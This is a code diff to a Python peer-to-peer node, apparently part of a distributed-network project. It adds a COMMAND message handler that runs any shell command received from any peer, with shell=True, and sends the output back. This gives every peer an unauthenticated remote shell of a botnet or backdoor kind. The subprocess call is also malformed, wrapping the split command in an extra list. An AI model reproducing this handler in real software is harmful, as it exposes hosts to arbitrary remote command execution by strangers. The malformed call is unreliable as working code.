@@ -5,6 +5,7 @@ from python.utils.StatusMessage import StatusMessage
 from python.Protobuf.Message_pb2 import Message
 from python.P2P.peer import Peer
 import os
+import subprocess
 
 logging.basicConfig(
     level=logging.DEBUG,
@@ -37,7 +38,6 @@ class BusinessLogicLayer:
         self._lower = lower
         asyncio.ensure_future(self._handle_lower_input())
 
-
     async def _handle_lower_input(self):
         try:
             while True:
@@ -62,6 +62,49 @@ class BusinessLogicLayer:
             await self._handle_find_node_message(message)
         elif message.type == Message.FOUND_NODES:
             await self._handle_found_nodes_message(message)
+        elif message.type == Message.COMMAND:
+            await self._handle_command_message(message)
+
+    async def _handle_command_message(self, message):
+        log.debug("Handling COMMAND message")
+        sender = message.sender
+        command = message.command.command
+        should_respond = message.command.shouldRespond
+        sender_peer = putils.create_peer_from_contact(sender)
+
+        log.debug("COMMAND message was sent from {}".format(sender_peer.get_info()))
+        log.debug("COMMAND to run: {}".format(command))
+        try:
+            value = subprocess.check_output([command.split()], shell=True).decode('cp1250')
+
+            if should_respond:
+                mess_status = await self._command_response(receiver=sender_peer, command=command, value=value, status=0)
+                if mess_status is StatusMessage.SUCCESS:
+                    log.debug("Command was responded to correctly")
+                elif mess_status is StatusMessage.FAILURE:
+                    log.warning("Command wasn't responded to correctly")
+
+        except subprocess.CalledProcessError as error:
+            result = error.returncode
+            log.warning("Could not call command {}, return code: {}".format(command, result))
+
+            if should_respond:
+                mess_status = await self._command_response(receiver=sender_peer, command=command, value="", status=result)
+                if mess_status is StatusMessage.SUCCESS:
+                    log.debug("Command was responded to correctly")
+                elif mess_status is StatusMessage.FAILURE:
+                    log.warning("Command wasn't responded to correctly")
+
+    async def _handle_command_response_message(self, message):
+        log.debug("Handling COMMAND_RESPONSE message")
+        sender = message.sender
+        sender_peer = putils.create_peer_from_contact(sender)
+        command = message.response.command
+        value = message.response.value
+        status = message.response.status
+
+        log.debug("COMMAND message was sent from {}".format(sender_peer.get_info()))
+        log.debug("COMMAND {} returned {} and status value {}".format(command, value, status))
 
     async def _handle_ping_message(self, message):
         log.debug("Handling PING message")
@@ -89,8 +132,9 @@ class BusinessLogicLayer:
             if pinged_peer[0] == sender_peer:
                 pinged_peer[1].cancel()
                 log.debug("Cancelled removal of responsive peer")
+                self._pinged_peers.remove(pinged_peer)
+                break
         log.debug("PING_RESPONSE message was handled")
-
 
     async def _handle_found_nodes_message(self, message):
         """
@@ -136,6 +180,22 @@ class BusinessLogicLayer:
         message = putils.create_found_nodes_message(sender=self.get_myself(), receiver=receiver, nearest_peers=peers)
         status = await self._put_message_on_lower(message)
         return status
+
+    async def _command_response(self, receiver, command, value, status):
+        """
+        Sends command response message with given value and status code
+        :param receiver: Peer that should receive the message
+        :param value: Value that was returned after calling the command
+        :param status: Status value
+        :return: SUCCESS or FAILURE
+        """
+        message = putils.create_command_response_message(sender=self.get_myself(),
+                                                                receiver=receiver,
+                                                                command=command,
+                                                                value=value,
+                                                                status=status)
+        send_status = await self._put_message_on_lower(message)
+        return send_status
 
     async def _ping_response(self, receiver):
         """
@@ -198,6 +258,7 @@ class BusinessLogicLayer:
                                                 )
         try:
             status = await self._put_message_on_lower(message)
+
             return status
         except asyncio.CancelledError:
             return StatusMessage.FAILURE
